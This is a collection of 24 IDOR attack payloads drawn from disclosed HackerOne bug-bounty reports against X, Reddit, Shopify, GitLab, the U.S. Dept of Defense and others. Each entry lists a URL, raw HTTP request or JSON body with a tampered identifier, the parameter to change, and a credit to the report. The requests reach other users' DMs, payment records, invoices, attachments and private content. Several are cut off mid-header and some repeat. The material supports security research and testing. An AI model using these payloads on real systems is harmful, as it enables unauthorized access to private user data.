# Insecure Direct Object Reference

24 payloads from disclosed reports.

## Insecure Direct Object Reference by manipulating the 'id' query parameter to access a specific DM

### `de80ddfa`

```
https://www.█████████/Download.aspx?id=4675
```

**Parameter:** `id`
— [IDOR leading unauthenticated attacker to download documents discloses PII of users and soldiers via https://www.█████████/Download.aspx?id= \[HtUS\]](https://hackerone.com/reports/1626508) · U.S. Dept Of Defense · [berserker22](https://hackerone.com/berserker22) · $500.0

### `acce0791`

```
https://target.com/1.1/direct_messages/show.json?id={DM-id}
```

**Parameter:** `id`
— [Insecure direct object reference - have access to deleted DM's](https://hackerone.com/reports/52646) · X / xAI · [akhil-reni](https://hackerone.com/akhil-reni)

### `e6be060f`

```
https://target.com/1.1/direct_messages/show.json?id=[noted-dm-id
```

**Parameter:** `id`
— [Insecure direct object reference - have access to deleted DM's](https://hackerone.com/reports/52646) · X / xAI · [akhil-reni](https://hackerone.com/akhil-reni)

### `35b0416c`

```
{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":20027039,"tax_country_code":"TW","payment_retry":0,"is_installment":false}
```

**Parameter:** `user_id`
— [IDOR allow access to payments data of any user](https://hackerone.com/reports/751577) · Nord Security · [dakitu](https://hackerone.com/dakitu)

### `12d98b59`

```
POST /sync HTTP/1.1
Host: 3d.cs.money
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/json;charset=utf-8
Content-Length: 286
Origin: https://target.com
Connection: close
Referer: https://target.com/g3sg1-black-sand-fn
Cookie: __cfduid=dd4a5ae822200c2e5a6622942c8e9b5c61600828055; TEST_GROUP=6; UUID3D=z8yNnunP7rEULv4; _ga=GA1.1.123687
```

**Parameter:** `steamid`
— [IDOR in https://target.com/](https://hackerone.com/reports/990878) · CS Money · [khoabda1](https://hackerone.com/khoabda1)


## IDOR via id parameter in GET request to retrieve user email

### `b0529466`

```
https://target.com/users/invite-user.php?id=(userid)&popup=1
```

**Parameter:** `id`
— [IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal](https://hackerone.com/reports/915114) · Automattic · [bugra](https://hackerone.com/bugra)

### `bfda7f37`

```
https://target.com/users/invite-user.php?id=19920465&popup=1
```

**Parameter:** `id`
— [IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal](https://hackerone.com/reports/915114) · Automattic · [bugra](https://hackerone.com/bugra)


## IDOR using access_token parameter to obtain high‑privilege token

### `20a58cc7`

```
POST /api/v1/arro_token?access_token=███████&myshopify_domain=target.com&id=42668326968 HTTP/1.1
Host: evil.com
Content-Type: application/json
Cookie: 
Connection: close
Accept: application/json
X-DeviceID: 
User-Agent: Shopify Ping/iOS/2.5.4 (iPhone12,3/com.shopify.ping/13.1.1) - Build 3006
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Content-Length: 0
```

**Parameter:** `access_token`
— [Low privileged user can create high privileged user's KITCRM authorization token and can read and write message to KIT](https://hackerone.com/reports/909863) · Shopify · [sandeep_rj49](https://hackerone.com/sandeep_rj49)


## IDOR by altering attachment ID in the URL path

### `f222ff92`

```
GET /attachments/938540538 HTTP/1.1
X-Signal-Agent: OWA
Accept-Encoding: gzip, deflate
X-Client-Version: BCM Android/5.1 Model/generic_Google_Nexus_6 Version/1.26.0 Build/1393 Area/200 Lang/en
Host: target.com
Connection: close
User-Agent: okhttp/3.12.0
```

**Parameter:** `id`
— [IDOR leading to downloading of any attachment](https://hackerone.com/reports/668439) · BCM Messenger · [naaash](https://hackerone.com/naaash)


## IDOR via base64-encoded JSON id parameter

### `a2755522`

```
https://target.com/people-rater/entry?id=eyJpZCI6Mn0=
```

**Parameter:** `id`
— [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335) · h1-ctf · [nytr0gen](https://hackerone.com/nytr0gen)


## IDOR via crafted JSON request body

### `f2bab7b0`

```
{"variables":{"platformUserId":"PLATFORM_USER_ID","offerId":"UUID_OFFER_ID"},"id":"475c91dd4480"}
```

**Parameter:** `variables`
— [Reddit talk promotion offers don't expire, allowing users to accept them after being demoted](https://hackerone.com/reports/1656380) · Reddit · [ahacker1](https://hackerone.com/ahacker1)


## IDOR enumeration using 'after' cursor parameter

### `da53a062`

```
{"id":"6243efcbc61d","variables":{"subredditName":"any-subreddit",
"after":"code-from-endCursor"
}}
```

**Parameter:** `after`
— [Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability](https://hackerone.com/reports/1658418) · Reddit · [high_ping_ninja](https://hackerone.com/high_ping_ninja) · $5,000.0


## IDOR exploitation by manipulating the id parameter to download unauthorized files

### `e680f7b2`

```
https://www.████████/Download.aspx?id=4675
```

**Parameter:** `id`
— [IDOR leading unauthenticated attacker to download documents discloses PII of users and soldiers via https://www.█████████/Download.aspx?id= \[HtUS\]](https://hackerone.com/reports/1626508) · U.S. Dept Of Defense · [berserker22](https://hackerone.com/berserker22) · $500.0


## IDOR exploitation by modifying the GraphQL mutation's id variable to access another user's invoice

### `6bcce4f8`

```
POST /api/shopify/██████?operation=BillingDocumentDownload&type=mutation HTTP/2
Host: target.com
Cookie: ██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: ████
Caller-Pathname: /store/█████████/access_account/invoice/██████
Content-Length: 433
Origin: https://target.com
S
```

**Parameter:** `id`
— [IDOR on GraphQL queries BillingDocumentDownload and BillDetails](https://hackerone.com/reports/2207248) · Shopify · [blaklis](https://hackerone.com/blaklis) · $5,000.0


## IDOR exploitation by supplying arbitrary label_ids in the board update JSON

### `c439b71f`

```
PUT /[username]/[project_name]/boards/[board_id].json HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 178
Connection: close
Cookie: [Cookies]

{"board":{"id":857058,"name":"Development","labels":[{"id":,"title":"","color":"#428BCA"}],"milestone_id":null,"assign
```

**Parameter:** `label_ids`
— [Add and Access to Labels of any Private Projects/Groups of Gitlab(IDOR)](https://hackerone.com/reports/439729) · GitLab · [indoappsec](https://hackerone.com/indoappsec)


## IDOR exploitation by supplying a crafted DM id

### `de3791a7`

```
https://target.com/1.1/direct_messages/show.json?id=578631102144741376
```

**Parameter:** `id`
— [Insecure direct object reference - have access to deleted DM's](https://hackerone.com/reports/52646) · X / xAI · [akhil-reni](https://hackerone.com/akhil-reni)


## IDOR to modify another user's profile by injecting malicious socialLinks JSON

### `1378d56b`

```
POST / HTTP/2
Host: evil.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 173
X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Compression: 1
Origin: https://target.com
Sec-Fetch
```

— [IDOR allows an attacker to modify the links of any user](https://hackerone.com/reports/1661113) · Reddit · [criptex](https://hackerone.com/criptex)


## IDOR by modifying base64‑encoded JSON id parameter

### `ae9a8e03`

```
{"id":1}
```

**Parameter:** `id`
— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)


## IDOR by modifying 'ID' query parameter to access other resources

### `6523eaa4`

```
POST /████████/Status.aspx?ID=x
```

**Parameter:** `ID`
— [Access to all █████████ files, including CAC authentication bypass](https://hackerone.com/reports/429000) · U.S. Dept Of Defense · [cablej_dds](https://hackerone.com/cablej_dds)


## IDOR by modifying subscription_id parameter

### `bdd7f3e7`

```
https://target.com/gold/payment-success?subscription_id=██████████&user_id=█████████
```

**Parameter:** `subscription_id`
— [\[target.com\] IDOR - Gold Subscription Details, Able to view "Membership ID" and "Validity Details" of other Users](https://hackerone.com/reports/344145) · Eternal · [riya](https://hackerone.com/riya) · $100.0


## IDOR by modifying 'user_id' parameter to access other users' videos

### `9574306e`

```
https://target.com/tools/widget/montage?widget=1&preview=1&user_id=36807051&badge_stream=channel&badge_channel=870575&badge_album=3231945&badge_layout=horizontal&badge_quantity=6&show_titles=no&badge_size=80
```

**Parameter:** `user_id`
— [CRITICAL vulnerability - Insecure Direct Object Reference - Unauthorized access to `Videos` of Channel whose privacy is set to `Private`.](https://hackerone.com/reports/45960) · Vimeo · [coolboss](https://hackerone.com/coolboss)


## IDOR via numeric identifier manipulation in the request path

### `29345255`

```
PUT /reports/████/summaries/███████ HTTP/2
Host: target.com
.....all header ...
Content-Length: 908
Origin: https://target.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"id":████████,"category":"researcher","content":"TESTEDIT\n\n{F3155244} ","updated_at":"2024-03-30T17:16:29.625Z","user":{"id":█████,"username":"█████","name":"██████████████","bio":"please see pdfx","cleared":false,"verified":false,"website":null,"location":"","created_at":"2024-
```

**Parameter:** `path`
— [Attachment disclosure via summary report ](https://hackerone.com/reports/2442008) · HackerOne · [xklepxn](https://hackerone.com/xklepxn)


## IDOR by supplying arbitrary 'username' to retrieve user IDs

### `11e14edf`

```
POST / HTTP/2
Host: target.com
Content-Length: 62
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36
X-Reddit
```

**Parameter:** `username`
— [IDOR allows an attacker to modify the links of any user](https://hackerone.com/reports/1661113) · Reddit · [criptex](https://hackerone.com/criptex)


## IDOR through GraphQL by modifying the 'id' variable in the request JSON

### `1cf452c2`

```
POST /api/graphql HTTP/2
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 1620
Origin: https://target.com
Cookie: <replace-here>
X-Csrf-Token: <replace-here>

{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query getModel($id: MlModelID!) {\n  mlModel(id: $id) {\n    
```

**Parameter:** `variables.id`
— [IDOR Exposes All Machine Learning Models](https://hackerone.com/reports/2528293) · GitLab · [moblig](https://hackerone.com/moblig) · $1,160.0
